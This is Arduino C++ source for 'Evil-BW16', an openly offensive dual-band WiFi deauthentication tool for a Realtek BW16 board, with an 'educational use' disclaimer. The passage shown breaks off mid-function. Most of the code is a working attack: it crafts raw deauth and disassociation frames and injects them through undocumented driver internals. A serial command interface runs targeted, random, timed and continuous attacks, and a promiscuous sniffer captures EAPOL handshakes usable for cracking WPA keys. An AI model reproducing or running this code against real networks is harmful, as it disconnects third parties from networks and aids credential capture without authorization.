/*
   Evil-BW16 - WiFi Dual band deauther

   Copyright (c) 2024 7h30th3r0n3

   Permission is hereby granted, free of charge, to any person obtaining a copy
   of this software and associated documentation files (the "Software"), to deal
   in the Software without restriction, including without limitation the rights
   to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
   copies of the Software, and to permit persons to whom the Software is
   furnished to do so, subject to the following conditions:

   The above copyright notice and this permission notice shall be included in all
   copies or substantial portions of the Software.

   THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
   IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
   AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
   LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
   OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
   SOFTWARE.

   Disclaimer:
   This tool, Evil-BW16, is developed for educational and ethical testing purposes only.
   Any misuse or illegal use of this tool is strictly prohibited. The creator of Evil-BW16
   assumes no liability and is not responsible for any misuse or damage caused by this tool.
   Users are required to comply with all applicable laws and regulations in their jurisdiction
   regarding network testing and ethical hacking.
*/

#include <Arduino.h>
#include "wifi_conf.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "WiFi.h"
#include "platform_stdlib.h"

#ifdef max
#undef max
#endif
#ifdef min
#undef min
#endif

#include <vector>

//==========================
// User Configuration
//==========================
#define WIFI_SSID       "7h30th3r0n35Ghz"
#define WIFI_PASS       "5Ghz7h30th3r0n3Pass"
#define WIFI_CHANNEL    1

bool USE_LED = true;

// Attack parameters
unsigned long last_cycle     = 0;
unsigned long cycle_delay    = 2000;     // Delay between attack cycles (ms)
unsigned long scan_time      = 5000;     // WiFi scan duration (ms)
unsigned long num_send_frames = 3;
int start_channel            = 1;        // 1 => 2.4GHz start, 36 => 5GHz only
bool scan_between_cycles     = false;    // If true, scans between each attack cycle

uint8_t dst_mac[6]  = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // Broadcast

enum SniffMode {
  SNIFF_ALL,
  SNIFF_BEACON,
  SNIFF_PROBE,
  SNIFF_DEAUTH,
  SNIFF_EAPOL,
  SNIFF_PWNAGOTCHI,
  SNIFF_STOP
};

// Channel hopping configuration
bool isHopping = false;
unsigned long lastHopTime = 0;
const unsigned long HOP_INTERVAL = 500; // 500ms between hops
const int CHANNELS_2GHZ[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13};
const int CHANNELS_5GHZ[] = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165};
int currentChannelIndex = 0;
int currentChannel = 36; // Default channel

SniffMode currentMode = SNIFF_STOP;  // Start in STOP mode
bool isSniffing = false;             // Global flag to track if sniffing is active

// Add these after the other global variables
const int MAX_CUSTOM_CHANNELS = 50;
int customChannels[MAX_CUSTOM_CHANNELS];
int numCustomChannels = 0;
bool useCustomChannels = false;

//-------------------
// Timed Attack
//-------------------
bool timedAttackEnabled      = false;
unsigned long attackStartTime = 0;
unsigned long attackDuration  = 10000; // default 10 seconds

//==========================================================
// Frame Structures
//==========================================================
typedef struct {
  uint16_t frame_control = 0xC0;  // Deauth
  uint16_t duration = 0xFFFF;
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  const uint16_t sequence_number = 0;
  uint16_t reason = 0x06;
} DeauthFrame;

typedef struct {
  uint16_t frame_control = 0xA0;  // Disassociation
  uint16_t duration = 0xFFFF;
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  const uint16_t sequence_number = 0;
  uint16_t reason = 0x08;
} DisassocFrame;

//==========================================================
// Data Structures
//==========================================================
struct WiFiScanResult {
  bool selected = false;
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint channel;
};

struct WiFiStationResult {
  bool selected = false;
  String mac_str;
  uint8_t mac[6];
  short rssi;
};

// =========================
// 802.11 Header Structure
// =========================
#pragma pack(push, 1)
struct wifi_ieee80211_mac_hdr {
  uint16_t frame_control;
  uint16_t duration_id;
  uint8_t  addr1[6];
  uint8_t  addr2[6];
  uint8_t  addr3[6];
  uint16_t seq_ctrl;
};
#pragma pack(pop)

static inline uint8_t ieee80211_get_type(uint16_t fc) {
  return (fc & 0x0C) >> 2;
}
static inline uint8_t ieee80211_get_subtype(uint16_t fc) {
  return (fc & 0xF0) >> 4;
}



// =========================
// Promiscuous Callback
// =========================
void promisc_callback(unsigned char *buf, unsigned int len, void * /*userdata*/) {
  if (currentMode == SNIFF_STOP) return;

  // Checks the minimum size to contain the 802.11 header
  if (!buf || len < sizeof(wifi_ieee80211_mac_hdr)) {
    return;
  }

  // Interpret the header
  wifi_ieee80211_mac_hdr *hdr = (wifi_ieee80211_mac_hdr *)buf;
  uint16_t fc = hdr->frame_control;
  uint8_t ftype = ieee80211_get_type(fc);
  uint8_t fsubtype = ieee80211_get_subtype(fc);

  // Filter based on current mode
  if (currentMode != SNIFF_ALL) {
    if (currentMode == SNIFF_BEACON && !(ftype == 0 && fsubtype == 8)) return;
    if (currentMode == SNIFF_PROBE && !(ftype == 0 && (fsubtype == 4 || fsubtype == 5))) return;
    if (currentMode == SNIFF_DEAUTH && !(ftype == 0 && (fsubtype == 12 || fsubtype == 10))) return;
    if (currentMode == SNIFF_EAPOL && (ftype != 2 || !isEAPOL(buf, len))) return;
    if (currentMode == SNIFF_PWNAGOTCHI && !(ftype == 0 && fsubtype == 8 && isPwnagotchiMac(hdr->addr2))) return;
  }

  String output = ""; // Initialize an output string to store the results

  // ============ Management ============
  if (ftype == 0) {
    // Beacon
    if (fsubtype == 8) {
      output += "[MGMT] Beacon detected ";
      // Source MAC => hdr->addr2
      output += "Source MAC: ";
      char macBuf[18];
      snprintf(macBuf, sizeof(macBuf), "%02X:%02X:%02X:%02X:%02X:%02X",
               hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
               hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
      output += macBuf;

      // Try to retrieve the ESSID
      const uint8_t *framePtr = (const uint8_t *)buf;
      String ssid = extractSSID(framePtr, len);
      if (ssid.length() > 0) {
        output += " SSID: " + ssid;
        // Check if it's a pwnagotchi (MAC DE:AD:BE:EF:DE:AD)
        if (isPwnagotchiMac(hdr->addr2)) {
          output += " Pwnagotchi Beacon!";
        }
      }
    }
    // Deauth
    else if (fsubtype == 12 || fsubtype == 10) {
      output += "[MGMT] Deauth detected ";
      // Sender MAC => hdr->addr2, Receiver MAC => hdr->addr1
      char senderMac[18], receiverMac[18];
      snprintf(senderMac, sizeof(senderMac), "%02X:%02X:%02X:%02X:%02X:%02X",
               hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
               hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
      snprintf(receiverMac, sizeof(receiverMac), "%02X:%02X:%02X:%02X:%02X:%02X",
               hdr->addr1[0], hdr->addr1[1], hdr->addr1[2],
               hdr->addr1[3], hdr->addr1[4], hdr->addr1[5]);
      output += "Sender MAC: " + String(senderMac) + " Receiver MAC: " + String(receiverMac);
      if (len >= 26) { // 24-byte header + 2 bytes reason
        uint16_t reasonCode = (uint16_t)buf[24] | ((uint16_t)buf[25] << 8);
        output += " Reason code: " + String(reasonCode);
      }
    }
    // Probe Request
    else if (fsubtype == 4) {
      output += "[MGMT] Probe Request ";
      // Displays the source
      char sourceMac[18];
      snprintf(sourceMac, sizeof(sourceMac), "%02X:%02X:%02X:%02X:%02X:%02X",
               hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
               hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
      output += "Source MAC: " + String(sourceMac);

      // Try to retrieve the requested ESSID (often, it's an empty SSID for scanning)
      const uint8_t *framePtr = (const uint8_t *)buf;
      String ssid = extractSSID(framePtr, len);
      if (ssid.length() > 0) {
        output += " Probe SSID: " + ssid;
      }
    }
    // Probe Response
    else if (fsubtype == 5) {
      output += "[MGMT] Probe Response ";
      // Displays the source
      char sourceMac[18];
      snprintf(sourceMac, sizeof(sourceMac), "%02X:%02X:%02X:%02X:%02X:%02X",
               hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
               hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
      output += "Source MAC: " + String(sourceMac);

      // Try to retrieve the ESSID
      const uint8_t *framePtr = (const uint8_t *)buf;
      String ssid = extractSSID(framePtr, len);
      if (ssid.length() > 0) {
        output += " SSID: " + ssid;
      }
    }
    // Disassoc
    else if (fsubtype == 10) {
      output += "[MGMT] Disassoc detected ";
      // Sender MAC => hdr->addr2, Receiver MAC => hdr->addr1
      char senderMac[18], receiverMac[18];
      snprintf(senderMac, sizeof(senderMac), "%02X:%02X:%02X:%02X:%02X:%02X",
               hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
               hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
      snprintf(receiverMac, sizeof(receiverMac), "%02X:%02X:%02X:%02X:%02X:%02X",
               hdr->addr1[0], hdr->addr1[1], hdr->addr1[2],
               hdr->addr1[3], hdr->addr1[4], hdr->addr1[5]);
      output += "Sender MAC: " + String(senderMac) + " Receiver MAC: " + String(receiverMac);
    }
    else {
      output += "[MGMT] Other subtype = " + String(fsubtype);
    }
  }
  // ============ Control ============
  else if (ftype == 1) {
    output += "[CTRL] Subtype = " + String(fsubtype);
  }
  // ============ Data ============
  else if (ftype == 2) {
    // Try EAPOL detection
    if (isEAPOL(buf, len)) {
      output += "[DATA] EAPOL detected! ";
      // Display source and destination MAC
      char sourceMac[18], destMac[18];
      snprintf(sourceMac, sizeof(sourceMac), "%02X:%02X:%02X:%02X:%02X:%02X",
               hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
               hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
      snprintf(destMac, sizeof(destMac), "%02X:%02X:%02X:%02X:%02X:%02X",
               hdr->addr1[0], hdr->addr1[1], hdr->addr1[2],
               hdr->addr1[3], hdr->addr1[4], hdr->addr1[5]);
      output += "Source MAC: " + String(sourceMac) + " Destination MAC: " + String(destMac);
    } else {
      output += "[DATA] Other data frame.";
    }
  }
  // ============ Extension (rare) ============
  else {
    output += "[EXT] Type = " + String(ftype);
  }

  // Print the output in a single line
  Serial.println(output);
}
// =========================
// Utility Functions
// =========================


void setChannel(int newChannel) {
  if (!isSniffing) {
    // Need to initialize WiFi first
    wifi_on(RTW_MODE_PROMISC);
    wifi_enter_promisc_mode();
  }
  currentChannel = newChannel;
  wifi_set_channel(currentChannel);
}

void hopChannel() {
  if (isHopping && (millis() - lastHopTime >= HOP_INTERVAL)) {
    currentChannelIndex++;

    if (useCustomChannels) {
      // Hopping on custom-defined channels
      if (currentChannelIndex >= numCustomChannels) {
        currentChannelIndex = 0;
      }
      currentChannel = customChannels[currentChannelIndex];
    } else {
      // Hopping between 2.4 GHz and 5.8 GHz bands
      static bool use5GHz = false; // Alternates between the two bands

      if (use5GHz) {
        // Check if we exceed the available channels in the 5 GHz band
        if (currentChannelIndex >= sizeof(CHANNELS_5GHZ) / sizeof(CHANNELS_5GHZ[0])) {
          currentChannelIndex = 0;
          use5GHz = false; // Switch to the 2.4 GHz band
        }
        currentChannel = CHANNELS_5GHZ[currentChannelIndex];
      } else {
        // Check if we exceed the available channels in the 2.4 GHz band
        if (currentChannelIndex >= sizeof(CHANNELS_2GHZ) / sizeof(CHANNELS_2GHZ[0])) {
          currentChannelIndex = 0;
          use5GHz = true; // Switch to the 5 GHz band
        }
        currentChannel = CHANNELS_2GHZ[currentChannelIndex];
      }
    }

    setChannel(currentChannel); // Set the selected channel
    Serial.print("[HOP] Switched to channel ");
    Serial.println(currentChannel);
    lastHopTime = millis(); // Update the last hop time
  }
}



void startSniffing() {
  if (!isSniffing) {
    Serial.println("[INFO] Enabling promiscuous mode...");

    // Initialize WiFi in PROMISC mode
    wifi_on(RTW_MODE_PROMISC);
    wifi_enter_promisc_mode();
    setChannel(currentChannel);
    wifi_set_promisc(RTW_PROMISC_ENABLE_2, promisc_callback, 1);

    isSniffing = true;
    Serial.println("[INFO] Sniffer initialized and running.");
  }
}

void stopSniffing() {
  if (isSniffing) {
    wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
    isSniffing = false;
    currentMode = SNIFF_STOP;
    Serial.println("[CMD] Sniffer stopped");
  }
}

// Prints a MAC address on the serial port, format XX:XX:XX:XX:XX:XX
void printMac(const uint8_t *mac) {
  char buf[18]; // XX:XX:XX:XX:XX:XX + terminator
  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  Serial.print(buf);
}


// Tries to extract the ESSID from a Beacon or Probe in the payload,
// assuming a basic Management header (24 bytes) + 12 fixed bytes
// => We usually start at offset 36 for the first tag.
// WARNING: This method is simplified and may fail if other tags precede the SSID.
String extractSSID(const uint8_t *frame, int totalLen) {
  // Minimal offset for the variable part (SSID tag) after a standard Beacon/Probe
  const int possibleOffset = 36;
  if (totalLen < possibleOffset + 2) {
    return "";
  }

  // The first tag should be the SSID tag (ID = 0)
  // frame[possibleOffset] = tagNumber, frame[possibleOffset+1] = tagLength
  uint8_t tagNumber  = frame[possibleOffset];
  uint8_t tagLength  = frame[possibleOffset + 1];

  // If we have an SSID tag
  if (tagNumber == 0 && possibleOffset + 2 + tagLength <= totalLen) {
    // Build the string
    String essid;
    for (int i = 0; i < tagLength; i++) {
      char c = (char)frame[possibleOffset + 2 + i];
      // Basic filter: only printable ASCII characters are shown
      if (c >= 32 && c <= 126) {
        essid += c;
      }
    }
    return essid;
  }
  // Not found / non-SSID tag
  return "";
}

// Checks if the source MAC is "DE:AD:BE:EF:DE:AD"
bool isPwnagotchiMac(const uint8_t *mac) {
  const uint8_t pwnMac[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD};
  for (int i = 0; i < 6; i++) {
    if (mac[i] != pwnMac[i]) return false;
  }
  return true;
}
bool isEAPOL(const uint8_t *buf, int len) {
  // Check the minimum size:
  // 24 bytes for the MAC header, +8 for LLC/SNAP, +4 for a minimal EAPOL
  if (len < (24 + 8 + 4)) {
    return false;
  }

  // First case: "classic" frame (without QoS)
  // Check for the presence of the LLC/SNAP header indicating EAPOL (0x88, 0x8E)
  if (buf[24] == 0xAA && buf[25] == 0xAA && buf[26] == 0x03 &&
      buf[27] == 0x00 && buf[28] == 0x00 && buf[29] == 0x00 &&
      buf[30] == 0x88 && buf[31] == 0x8E) {
    return true;
  }

  // Second case: QoS frame (Frame Control field indicates a QoS data subtype)
  // We identify this if (buf[0] & 0x0F) == 0x08 (subtype = 1000b = 8)
  // In this case, the QoS header adds 2 extra bytes after the initial 24 bytes,
  // so the LLC/SNAP header starts at offset 24 + 2 = 26
  if ((buf[0] & 0x0F) == 0x08) {
    if (buf[26] == 0xAA && buf[27] == 0xAA && buf[28] == 0x03 &&
        buf[29] == 0x00 && buf[30] == 0x00 && buf[31] == 0x00 &&
        buf[32] == 0x88 && buf[33] == 0x8E) {
      return true;
    }
  }

  return false;
}


//==========================================================
// Externs & Prototypes (Realtek / Ameba Specific)
//==========================================================
extern uint8_t* rltk_wlan_info;
extern "C" void* alloc_mgtxmitframe(void* ptr);
extern "C" void update_mgntframe_attrib(void* ptr, void* frame_control);
extern "C" int dump_mgntframe(void* ptr, void* frame_control);

// Typically: int wifi_get_mac_address(char *mac);
extern "C" int wifi_get_mac_address(char *mac);

//==========================================================
// Function Prototypes
//==========================================================
void wifi_tx_raw_frame(void* frame, size_t length);
void wifi_tx_deauth_frame(const void* src_mac, const void* dst_mac, uint16_t reason = 0x06);
void wifi_tx_disassoc_frame(const void* src_mac, const void* dst_mac, uint16_t reason = 0x08);

int scanNetworks();
void printScanResults();
void handleCommand(String command);
void targetAttack();
void generalAttack();
void attackCycle();
void startTimedAttack(unsigned long durationMs);
void checkTimedAttack();

//==========================================================
// Global Vectors
//==========================================================
std::vector<WiFiScanResult> scan_results;
std::vector<WiFiScanResult> target_aps;

//==========================================================
// Disassociation Attack Control
//==========================================================
bool disassoc_enabled           = false;  // If true, perform continuous disassoc
unsigned long disassoc_interval = 1000;   // Interval in ms
unsigned long last_disassoc_attack = 0;

//==========================================================
// Raw Frame Injection
//==========================================================
void wifi_tx_raw_frame(void* frame, size_t length) {
  void *ptr = (void *)**(uint32_t **)(rltk_wlan_info + 0x10);
  void *frame_control = alloc_mgtxmitframe(ptr + 0xae0);

  if (frame_control != 0) {
    update_mgntframe_attrib(ptr, frame_control + 8);
    memset((void *) * (uint32_t *)(frame_control + 0x80), 0, 0x68);
    uint8_t *frame_data = (uint8_t *) * (uint32_t *)(frame_control + 0x80) + 0x28;
    memcpy(frame_data, frame, length);
    *(uint32_t *)(frame_control + 0x14) = length;
    *(uint32_t *)(frame_control + 0x18) = length;
    dump_mgntframe(ptr, frame_control);
  }
}

//==========================================================
// Deauth & Disassoc
//==========================================================
void wifi_tx_deauth_frame(const void* src_mac, const void* dst_mac, uint16_t reason) {
  DeauthFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.reason = reason;
  wifi_tx_raw_frame((void*)&frame, sizeof(DeauthFrame));
}

void wifi_tx_disassoc_frame(const void* src_mac, const void* dst_mac, uint16_t reason) {
  DisassocFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.reason = reason;
  wifi_tx_raw_frame((void*)&frame, sizeof(DisassocFrame));
}

//==========================================================
// Sorting Helper
//==========================================================
void sortByChannel(std::vector<WiFiScanResult> &results) {
  for (size_t i = 0; i < results.size(); i++) {
    size_t min_idx = i;
    for (size_t j = i + 1; j < results.size(); j++) {
      if (results[j].channel < results[min_idx].channel) {
        min_idx = j;
      }
    }
    if (min_idx != i) {
      WiFiScanResult temp = results[i];
      results[i] = results[min_idx];
      results[min_idx] = temp;
    }
  }
}

//==========================================================
// Wi-Fi Scan Callback
//==========================================================
rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  if (scan_result->scan_complete == 0) {
    rtw_scan_result_t *record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;

    // Keep only APs >= start_channel if you want to filter 5GHz
    if (record->channel >= start_channel) {
      WiFiScanResult result;
      result.ssid = String((const char*) record->SSID.val);
      result.channel = record->channel;
      result.rssi = record->signal_strength;
      memcpy(&result.bssid, &record->BSSID, 6);

      char bssid_str[20];
      snprintf(bssid_str, sizeof(bssid_str),
               "%02X:%02X:%02X:%02X:%02X:%02X",
               result.bssid[0], result.bssid[1], result.bssid[2],
               result.bssid[3], result.bssid[4], result.bssid[5]);
      result.bssid_str = bssid_str;
      scan_results.push_back(result);
    }
  } else {
    // Scan completed
  }
  return RTW_SUCCESS;
}

//==========================================================
// Start a WiFi Scan
//==========================================================
int scanNetworks() {
  Serial.println("Starting WiFi scan...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    if (USE_LED) digitalWrite(LED_G, HIGH);
    delay(scan_time);
    Serial.println("Scan completed!");

    // Sort results by channel
    sortByChannel(scan_results);
    if (USE_LED) digitalWrite(LED_G, LOW);
    return 0;
  } else {
    Serial.println("Failed to start the scan!");
    return 1;
  }
}

//==========================================================
// Print Scan Results
//==========================================================
void printScanResults() {
  Serial.println("Detected networks:");
  for (size_t i = 0; i < scan_results.size(); i++) {
    String freq = (scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz";
    Serial.print(i);
    Serial.print("\tSSID: ");
    Serial.print(scan_results[i].ssid);
    Serial.print("\tBSSID: ");
    Serial.print(scan_results[i].bssid_str);
    Serial.print("\tChannel: ");
    Serial.print(scan_results[i].channel);
    Serial.print("\tRSSI: ");
    Serial.print(scan_results[i].rssi);
    Serial.print(" dBm\t");
    Serial.println(freq);
  }
}

//==========================================================
// Attack State Variables
//==========================================================
bool attack_enabled = false;
bool scan_enabled   = false;
bool target_mode    = false;

//==========================================================
// Timed Attack
//==========================================================
void startTimedAttack(unsigned long durationMs) {
  timedAttackEnabled = true;
  attackStartTime    = millis();
  attackDuration     = durationMs;
  attack_enabled     = true;
}

void checkTimedAttack() {
  if (timedAttackEnabled && (millis() - attackStartTime > attackDuration)) {
    attack_enabled     = false;
    timedAttackEnabled = false;
    Serial.println("[INFO] Timed attack ended.");
  }
}

//==========================================================
// Handle Incoming Commands
//==========================================================
void handleCommand(String command) {
  command.trim();

  // Deauth Attack Commands
  if (command.equalsIgnoreCase("start deauther")) {
    attack_enabled = true;
    Serial.println("[INFO] Deauthentication Attack started.");
  }
  else if (command.equalsIgnoreCase("stop deauther")) {
    // Unified stop command: Stops all active attacks
    attack_enabled = false;
    disassoc_enabled = false;
    Serial.println("[INFO] All attacks stopped.");
  }
  else if (command.equalsIgnoreCase("scan")) {
    scan_enabled = true;
    Serial.println("[INFO] Starting scan...");
    if (scanNetworks() == 0) {
      printScanResults();
      scan_enabled = false;
      Serial.println("[INFO] Scan completed.");
    }
    else {
      Serial.println("[ERROR] Scan failed.");
    }
  }
  else if (command.equalsIgnoreCase("results")) {
    if (!scan_results.empty()) {
      printScanResults();
    }
    else {
      Serial.println("[INFO] No scan results available. Try 'scan' first.");
    }
  }

  //==========================
  // Timed Attack
  //==========================
  else if (command.startsWith("attack_time ")) {
    String valStr = command.substring(String("attack_time ").length());
    unsigned long durationMs = valStr.toInt();
    if (durationMs > 0) {
      startTimedAttack(durationMs);
      Serial.println("[INFO] Timed attack started for " + String(durationMs) + " ms.");
    }
    else {
      Serial.println("[ERROR] Invalid attack duration.");
    }
  }

  //==========================
  // Disassociation Attack Commands (Start Only)
  //==========================
  else if (command.equalsIgnoreCase("disassoc")) {
    if (!disassoc_enabled) {
      disassoc_enabled = true;
      Serial.println("[INFO] Continuous Disassociation Attack started.");
    }
    else {
      Serial.println("[INFO] Disassociation Attack is already running.");
    }
  }

  //==========================
  // Random Channel Attack
  //==========================
  else if (command.equalsIgnoreCase("random_attack")) {
    if (!scan_results.empty()) {
      size_t idx = random(0, scan_results.size());
      uint8_t randChannel = scan_results[idx].channel;
      wifi_set_channel(randChannel);
      for (int j = 0; j < num_send_frames; j++) {
        wifi_tx_deauth_frame(scan_results[idx].bssid, dst_mac, 2);
        Serial.print("[RANDOM ATTACK] Deauth ");
        Serial.print(j + 1);
        Serial.print(" => ");
        Serial.print(scan_results[idx].ssid);
        Serial.print(" on channel ");
        Serial.println(randChannel);
      }
    }
    else {
      Serial.println("[ERROR] No AP results available. Run 'scan' first.");
    }
  }
  else if (command == "start sniff") {
    currentMode = SNIFF_ALL;
    startSniffing();
    Serial.println("[CMD] Starting sniffer in ALL mode");
  }
  else if (command == "hop on") {
    isHopping = true;
    if (!isSniffing) {
      wifi_on(RTW_MODE_PROMISC);
      wifi_enter_promisc_mode();
    }
    Serial.println("[CMD] Channel hopping enabled");
  }
  else if (command == "hop off") {
    isHopping = false;
    Serial.println("[CMD] Channel hopping disabled");
  }
  else if (command.startsWith("set ch ")) {
    String chStr = command.substring(7);

    // Check if it's a comma-separated list
    if (chStr.indexOf(',') != -1) {
      // Reset custom channels
      numCustomChannels = 0;
      useCustomChannels = false;

      // Parse comma-separated channels
      while (chStr.length() > 0) {
        int commaIndex = chStr.indexOf(',');
        String channelStr;

        if (commaIndex == -1) {
          channelStr = chStr;
          chStr = "";
        } else {
          channelStr = chStr.substring(0, commaIndex);
          chStr = chStr.substring(commaIndex + 1);
        }

        channelStr.trim();
        int newChannel = channelStr.toInt();

        // Validate channel
        bool validChannel = false;
        for (int ch : CHANNELS_2GHZ) {
          if (ch == newChannel) validChannel = true;
        }
        for (int ch : CHANNELS_5GHZ) {
          if (ch == newChannel) validChannel = true;
        }

        if (validChannel && numCustomChannels < MAX_CUSTOM_CHANNELS) {
          customChannels[numCustomChannels++] = newChannel;
        }
      }

      if (numCustomChannels > 0) {
        useCustomChannels = true;
        isHopping = true;
        currentChannelIndex = 0;
        currentChannel = customChannels[0];
        setChannel(currentChannel);
        Serial.print("[CMD] Set custom channel sequence: ");
        for (int i = 0; i < numCustomChannels; i++) {
          Serial.print(customChannels[i]);
          if (i < numCustomChannels - 1) Serial.print(",");
        }
        Serial.println();
      }
    } else {
      // Single channel setting (existing code)
      int newChannel = chStr.toInt();
      bool validChannel = false;
      for (int ch : CHANNELS_2GHZ) {
        if (ch == newChannel) validChannel = true;
      }
      for (int ch : CHANNELS_5GHZ) {
        if (ch == newChannel) validChannel = true;
      }
      if (validChannel) {
        isHopping = false;
        useCustomChannels = false;
        setChannel(newChannel);
        Serial.print("[CMD] Set to channel ");
        Serial.println(currentChannel);
      } else {
        Serial.println("[ERROR] Invalid channel number");
      }
    }
  }
  else if (command == "sniff beacon") {
    currentMode = SNIFF_BEACON;
    startSniffing();
    Serial.println("[CMD] Switching to BEACON sniffing mode");
  }
  else if (command == "sniff probe") {
    currentMode = SNIFF_PROBE;
    startSniffing();
    Serial.println("[CMD] Switching to PROBE sniffing mode");
  }
  else if (command == "sniff deauth") {
    currentMode = SNIFF_DEAUTH;
    startSniffing();
    Serial.println("[CMD] Switching to DEAUTH sniffing mode");
  }
  else if (command == "sniff eapol") {
    currentMode = SNIFF_EAPOL;
    startSniffing();
    Serial.println("[CMD] Switching to EAPOL sniffing mode");
  }
  else if (command == "sniff pwnagotchi") {
    currentMode = SNIFF_PWNAGOTCHI;
    startSniffing();
    Serial.println("[CMD] Switching to PWNAGOTCHI sniffing mode");
  }
  else if (command == "sniff all") {
    currentMode = SNIFF_ALL;
    startSniffing();
    Serial.println("[CMD] Switching to ALL sniffing mode");
  }
  else if (command == "stop sniff") {
    stopSniffing();
  }
  //==========================
  // "set" Command (Existing)
  //==========================
  else if (command.startsWith("set ")) {
    String setting = command.substring(4);
    setting.trim();
    int space_index = setting.indexOf(' ');
    if (space_index != -1) {
      String key = setting.substring(0, space_index);
      String value = setting.substring(space_index + 1);
      value.replace(" ", "");

      if (key.equalsIgnoreCase("cycle_delay")) {
        cycle_delay = value.toInt();
        Serial.println("[INFO] Updated cycle_delay to " + String(cycle_delay) + " ms.");
      }
      else if (key.equalsIgnoreCase("scan_time")) {
        scan_time = value.toInt();
        Serial.println("[INFO] Updated scan_time to " + String(scan_time) + " ms.");
      }
      else if (key.equalsIgnoreCase("num_frames")) {
        num_send_frames = value.toInt();
        Serial.println("[INFO] Updated num_send_frames to " + String(num_send_frames) + ".");
      }
      else if (key.equalsIgnoreCase("start_channel")) {
        start_channel = value.toInt();
        Serial.println("[INFO] Updated start_channel to " + String(start_channel) + ".");
      }
      else if (key.equalsIgnoreCase("scan_cycles")) {
        if (value.equalsIgnoreCase("on")) {
          scan_between_cycles = true;
          Serial.println("[INFO] Scan between attack cycles activated.");
        }
        else if (value.equalsIgnoreCase("off")) {
          scan_between_cycles = false;
          Serial.println("[INFO] Scan between attack cycles deactivated.");
        }
        else {
          Serial.println("[ERROR] Invalid value for scan_cycles. Use 'on' or 'off'.");
        }
      }
      else if (key.equalsIgnoreCase("led")) {
        if (value.equalsIgnoreCase("on")) {
          USE_LED = true;
          Serial.println("[INFO] LEDs activated.");
        }
        else if (value.equalsIgnoreCase("off")) {
          USE_LED = false;
          Serial.println("[INFO] LEDs deactivated.");
        }
        else {
          Serial.println("[ERROR] Invalid value for LED. Use 'set led on' or 'set led off'.");
        }
      }
      else if (key.equalsIgnoreCase("target")) {
        // e.g., set target 1,2,3
        target_aps.clear();
        target_mode = false;

        int start = 0;
        int end   = 0;
        while ((end = value.indexOf(',', start)) != -1) {
          String index_str = value.substring(start, end);
          int target_index = index_str.toInt();
          if (target_index >= 0 && target_index < (int)scan_results.size()) {
            target_aps.push_back(scan_results[target_index]);
          }
          else {
            Serial.println("[ERROR] Invalid target index: " + index_str);
          }
          start = end + 1;
        }

        // Last index
        if (start < value.length()) {
          String index_str = value.substring(start);
          int target_index = index_str.toInt();
          if (target_index >= 0 && target_index < (int)scan_results.size()) {
            target_aps.push_back(scan_results[target_index]);
          }
          else {
            Serial.println("[ERROR] Invalid target index: " + index_str);
          }
        }

        if (!target_aps.empty()) {
          target_mode = true;
          Serial.println("[INFO] Targeting the following APs:");
          for (size_t i = 0; i < target_aps.size(); i++) {
            Serial.print("- SSID: ");
            Serial.print(target_aps[i].ssid);
            Serial.print(" BSSID: ");
            Serial.println(target_aps[i].bssid_str);
          }
        }
        else {
          target_mode = false;
          Serial.println("[ERROR] No valid targets selected.");
        }
      }
      else {
        Serial.println("[ERROR] Unknown setting: " + key);
      }
    }
    else {
      Serial.println("[ERROR] Invalid format. Use: set <key> <value>");
    }
  }
  else if (command.equalsIgnoreCase("info")) {
    Serial.println("[INFO] Current Configuration:");
    Serial.println("Cycle Delay: " + String(cycle_delay) + " ms");
    Serial.println("Scan Time: " + String(scan_time) + " ms");
    Serial.println("Number of Frames per AP: " + String(num_send_frames));
    Serial.println("Start Channel: " + String(start_channel));
    Serial.println("Scan between attack cycles: " + String(scan_between_cycles ? "Enabled" : "Disabled"));
    Serial.println("LEDs: " + String(USE_LED ? "On" : "Off"));

    if (target_mode && !target_aps.empty()) {
      Serial.println("[INFO] Targeted APs:");
      for (size_t i = 0; i < target_aps.size(); i++) {
        Serial.print("- SSID: ");
        Serial.print(target_aps[i].ssid);
